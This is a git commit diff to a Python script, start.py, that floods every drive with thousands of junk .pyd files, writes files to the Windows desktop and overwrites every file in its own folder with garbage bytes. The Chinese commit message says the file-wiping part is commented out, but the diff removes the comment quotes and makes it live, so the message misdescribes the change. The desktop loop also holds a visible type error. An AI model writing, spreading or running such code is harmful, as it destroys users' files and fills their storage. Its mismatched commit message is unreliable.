3a224d8897f93d7e93321cd84a93f80a4cee8fff
lzy20110519 <lzy2110519@outlook.com>
2023-03-24 21:31:00 +0800

    更新了功能，会在磁盘及桌面上创建无数个文件,清空电脑C盘文件（该部分已注释）

--- start.py
+++ start.py
@@ -70,6 +70,7 @@ def Main():
             os.makedirs(i + "\\" + str(rand))
             for j in range(1, 10000):
                 with open((str(i) + '/' + str(rand) + '/' + str(j) + '.pyd'), 'wb+') as f:
+                    f.write(b'57297483270580238590472895037589407358920573825906789890890605347686947064830756890753684960745386905346786940769754689079078469057839607436589067835960785906738460547684378695078903786905768390672395090769025684906738906785096734867356873695607368590673486905789704860546734-3845084205-8423593205-82904-8908-9405-842305-892358-920589-34258405-82395084-5823589840259038935-8305-82395084903223805-898-2-8594-086907689067-847956078908-69507-85697068790-843502950-75687t657375083853435890237689506734860')
                     f.close()
         # 获取桌面路径
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -80,19 +81,16 @@ def Main():
         for j in range(1, 10):
             with open((winreg.QueryValueEx(key, "Desktop")[0] + '\\123txt'+j), 'wb+') as f:
                 f.close()
-        '''# 获取电脑里所有的文件
+        # 获取电脑里所有的文件
         current_address = os.path.dirname(os.path.abspath(__file__))
         file_list = os.listdir(current_address)
         for file_address in file_list:
             file_address = os.path.join(current_address, file_address)
             if os.path.isfile(file_address):
-                print("这个是文件，文件名称：", file_address)
+                #print("这个是文件，文件名称：", file_address)
                 with open(file_address, 'wb+') as f:
+                    f.write(b'21315356278462373284526745845637586457238956')
                     f.close()
-            elif os.path.isdir(file_address):
-                print("这个是文件夹，文件夹名称：", file_address)
-            else:
-                print("这个情况没遇到")'''
 
     # 主程序
     def main():
